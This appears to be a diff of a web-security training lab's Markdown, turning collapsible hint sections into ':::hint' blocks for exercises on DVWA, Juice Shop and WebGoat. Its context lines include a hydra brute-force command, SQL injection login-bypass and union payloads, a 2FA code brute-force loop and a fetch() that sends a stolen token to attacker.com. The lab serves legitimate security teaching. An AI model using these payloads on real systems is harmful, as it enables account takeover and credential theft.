@@ -109,9 +109,7 @@ if (password_verify($password, $user['password_hash'])) {
 **Setup**: Navigate to DVWA Brute Force page  
 **Goal**: Gain access using common passwords
 
-<details>
-<summary>💡 Hint 1: Start simple</summary>
-
+:::hint 💡 Hint 1: Start simple
 Before using tools, try common passwords manually:
 - password
 - 123456
@@ -120,33 +118,27 @@ Before using tools, try common passwords manually:
 
 What usernames might exist? admin? user? test?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Observe the response</summary>
-
+:::hint 💡 Hint 2: Observe the response
 Try different username/password combinations. Does the error message change between:
 - Valid username, wrong password
 - Invalid username
 
 This information leak can help!
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Use a wordlist</summary>
-
+:::hint 💡 Hint 3: Use a wordlist
 Manual attempts not working? Time to automate. Tools like Hydra or Burp Intruder can help. You'll need:
 - Target URL
 - Username list
 - Password list
 - Failure indicator
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Manual Method**:
 Username: `admin`
 Password: `password`
@@ -164,7 +156,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 4. Use cluster bomb attack with wordlists
 5. Look for different response length/code
 
-</details>
+:::
 
 ---
 
@@ -173,9 +165,7 @@ hydra -l admin -P /usr/share/wordlists/rockyou.txt \
 **Setup**: Use Juice Shop with two different browsers  
 **Goal**: Steal and use another user's session
 
-<details>
-<summary>💡 Hint 1: Find the session token</summary>
-
+:::hint 💡 Hint 1: Find the session token
 After logging in, check:
 - Cookies (F12 → Application → Cookies)
 - Local Storage
@@ -183,11 +173,9 @@ After logging in, check:
 
 What stores the authentication state?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Copy the session</summary>
-
+:::hint 💡 Hint 2: Copy the session
 In Browser 1:
 1. Login as any user
 2. Copy the session token
@@ -199,21 +187,17 @@ In Browser 2:
 
 How would you set a cookie via JavaScript?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Token location matters</summary>
-
+:::hint 💡 Hint 3: Token location matters
 Juice Shop uses JWT tokens. They might be in:
 - `Authorization` header as `Bearer <token>`
 - Cookie named `token`
 - Local storage as `token`
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Step 1**: Login and get token (Browser 1)
 ```javascript
 // In console after login
@@ -244,7 +228,7 @@ fetch('http://attacker.com/steal', {
 })
 ```
 
-</details>
+:::
 
 ---
 
@@ -253,9 +237,7 @@ fetch('http://attacker.com/steal', {
 **Setup**: Navigate to WebGoat Password Reset lesson  
 **Goal**: Reset another user's password
 
-<details>
-<summary>💡 Hint 1: Understand the flow</summary>
-
+:::hint 💡 Hint 1: Understand the flow
 Try the password reset process normally:
 1. Click "Forgot Password"
 2. Enter your username
@@ -263,11 +245,9 @@ Try the password reset process normally:
 
 What information is required? How predictable is it?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Security questions weakness</summary>
-
+:::hint 💡 Hint 2: Security questions weakness
 Common security questions are often:
 - Publicly available (mother's maiden name)
 - Easily guessable (favorite color)
@@ -275,11 +255,9 @@ Common security questions are often:
 
 Can you guess or research the answers?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Check for other flaws</summary>
-
+:::hint 💡 Hint 3: Check for other flaws
 Look at:
 - The password reset URL/token
 - Hidden form fields
@@ -287,11 +265,9 @@ Look at:
 
 Is the reset token predictable? Can you modify the request?
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Method 1: Weak Security Questions**
 ```
 Username: larry
@@ -318,7 +294,7 @@ Try:
 **Method 4: Race Condition**
 Send multiple reset requests rapidly - some apps generate the same token!
 
-</details>
+:::
 
 ---
 
@@ -327,9 +303,7 @@ Send multiple reset requests rapidly - some apps generate the same token!
 **Setup**: Navigate to DVWA SQL Injection page  
 **Goal**: Login without knowing the password
 
-<details>
-<summary>💡 Hint 1: SQL Injection basics</summary>
-
+:::hint 💡 Hint 1: SQL Injection basics
 Think about the SQL query:
 ```sql
 SELECT * FROM users WHERE user='[input]' AND password='[input]'
@@ -337,11 +311,9 @@ SELECT * FROM users WHERE user='[input]' AND password='[input]'
 
 How can you make this always true?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 2: Comment syntax</summary>
-
+:::hint 💡 Hint 2: Comment syntax
 SQL comments can ignore the rest of the query:
 - MySQL: `-- ` or `#`
 - MSSQL: `--`
@@ -349,11 +321,9 @@ SQL comments can ignore the rest of the query:
 
 How would you use this?
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint 3: Always true conditions</summary>
-
+:::hint 💡 Hint 3: Always true conditions
 What SQL conditions are always true?
 - `1=1`
 - `'a'='a'`
@@ -361,11 +331,9 @@ What SQL conditions are always true?
 
 Combine with comments for bypass!
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 4
 **Classic Bypass**:
 ```
 Username: admin' --
@@ -400,7 +368,7 @@ SELECT * FROM users WHERE user='admin' -- ' AND password='wrong'
 Username: ' or 1=1 union select null, username, password from users --
 ```
 
-</details>
+:::
 
 ---
 
@@ -408,31 +376,25 @@ Username: ' or 1=1 union select null, username, password from users --
 
 **Goal**: Bypass 2FA implementation flaws
 
-<details>
-<summary>🎯 Challenge Overview</summary>
-
+:::hint 🎯 Hint 1
 Even with 2FA, implementations can be flawed:
 1. Response manipulation
 2. Code reuse
 3. Race conditions
 4. Backup code weaknesses
 
-</details>
+:::
 
-<details>
-<summary>💡 Hint: Common 2FA flaws</summary>
-
+:::hint 💡 Hint 2
 Check for:
 - Can you skip the 2FA step by going directly to `/dashboard`?
 - Does the server verify the code or just the client?
 - Can you use the same code twice?
 - Are backup codes predictable?
 
-</details>
+:::
 
-<details>
-<summary>🔓 Solution</summary>
-
+:::hint 🔓 Hint 3
 **Method 1: Direct Access**
 ```
 1. Login with username/password
@@ -462,7 +424,7 @@ for code in range(000000, 999999):
 3. Some apps don't invalidate used codes!
 ```
 
-</details>
+:::
 
 ---
 
